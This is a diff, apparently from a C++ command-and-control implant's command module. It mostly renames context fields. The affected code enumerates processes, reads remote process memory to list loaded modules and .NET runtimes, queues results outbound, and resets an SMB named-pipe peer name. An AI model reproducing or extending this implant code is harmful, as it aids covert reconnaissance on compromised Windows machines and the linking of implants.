@@ -102,19 +102,19 @@ namespace Commands {
             return_defer(ERROR_PROCESS_IS_PROTECTED);
         }
 
-        if (NT_SUCCESS(Ctx->Nt.NtQueryInformationProcess(process, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), nullptr)) ) {
+        if (NT_SUCCESS(Ctx->nt.NtQueryInformationProcess(process, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), nullptr)) ) {
 
             if (
-                !NT_SUCCESS(Ctx->Nt.NtReadVirtualMemory(process, &pbi.PebBaseAddress->Ldr, &loads, sizeof(PPEB_LDR_DATA), &size)) ||
-                !NT_SUCCESS(Ctx->Nt.NtReadVirtualMemory(process, &loads->InMemoryOrderModuleList.Flink, &entry, sizeof(PLIST_ENTRY), nullptr))) {
+                !NT_SUCCESS(Ctx->nt.NtReadVirtualMemory(process, &pbi.PebBaseAddress->Ldr, &loads, sizeof(PPEB_LDR_DATA), &size)) ||
+                !NT_SUCCESS(Ctx->nt.NtReadVirtualMemory(process, &loads->InMemoryOrderModuleList.Flink, &entry, sizeof(PLIST_ENTRY), nullptr))) {
                 return_defer(ntstatus);
             }
 
             head = &loads->InMemoryOrderModuleList;
             while (entry != head) {
                 if (
-                    !NT_SUCCESS(Ctx->Nt.NtReadVirtualMemory(process, CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks), &module, sizeof(LDR_DATA_TABLE_ENTRY), nullptr)) ||
-                    !NT_SUCCESS(Ctx->Nt.NtReadVirtualMemory(process, module.FullDllName.Buffer, &modname_w, module.FullDllName.Length, &size)) ||
+                    !NT_SUCCESS(Ctx->nt.NtReadVirtualMemory(process, CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks), &module, sizeof(LDR_DATA_TABLE_ENTRY), nullptr)) ||
+                    !NT_SUCCESS(Ctx->nt.NtReadVirtualMemory(process, module.FullDllName.Buffer, &modname_w, module.FullDllName.Length, &size)) ||
                     size != module.FullDllName.Length) {
                     return_defer(ntstatus);
                 }
@@ -175,11 +175,11 @@ namespace Commands {
             cid.UniqueProcess   = R_CAST(HANDLE, entries.th32ProcessID);
 
             InitializeObjectAttributes(&attr, nullptr, 0, nullptr, nullptr);
-            if (!NT_SUCCESS(Ctx->Nt.NtOpenProcess(&process, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &attr, &cid))) {
+            if (!NT_SUCCESS(Ctx->nt.NtOpenProcess(&process, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &attr, &cid))) {
                 continue;
             }
 
-            if (SUCCEEDED(Ctx->CLR.CLRCreateInstance(GUID_CLSID_CLRMetaHost, GUID_IID_ICLRMetaHost, R_CAST(void**, &meta)))) {
+            if (SUCCEEDED(Ctx->clr.CLRCreateInstance(GUID_CLSID_CLRMetaHost, GUID_IID_ICLRMetaHost, R_CAST(void**, &meta)))) {
                 if (SUCCEEDED((meta)->lpVtbl->EnumerateInstalledRuntimes(meta, &enums))) {
 
                     while (S_OK == enums->Next(0x1, R_CAST(IUnknown**, &runtime), nullptr)) {
@@ -206,12 +206,12 @@ namespace Commands {
             if (runtime)    { runtime->lpVtbl->Release(runtime); }
             if (enums)      { enums->Release(); }
 
-            Ctx->Nt.NtClose(process);
+            Ctx->nt.NtClose(process);
         } while (Ctx->win32.Process32Next(snapshot, &entries));
 
         Dispatcher::OutboundQueue(out);
         if (snapshot) {
-            Ctx->Nt.NtClose(snapshot);
+            Ctx->nt.NtClose(snapshot);
         }
     }
 
@@ -227,13 +227,13 @@ namespace Commands {
     VOID UpdatePeer(_parser *parser) {
         HEXANE
 
-        auto nameLength = x_wcslen(Ctx->config.ingress_pipe) * sizeof(WCHAR);
+        auto name_length = x_wcslen(Ctx->transport.smb->ingress_name) * sizeof(WCHAR);
 
-        if (Ctx->config.ingress_pipe) {
-            x_memset(Ctx->config.IngressPipename, 0, nameLength);
-            x_free(Ctx->config.IngressPipename);
+        if (Ctx->transport.smb->ingress_name) {
+            x_memset(Ctx->transport.smb->ingress_name, 0, name_length);
+            x_free(Ctx->transport.smb->ingress_name);
         }
 
-        Parser::ParserWcscpy(parser, &Ctx->config.IngressPipename, nullptr);
+        Parser::ParserWcscpy(parser, &Ctx->transport.smb->ingress_name, nullptr);
     }
 }
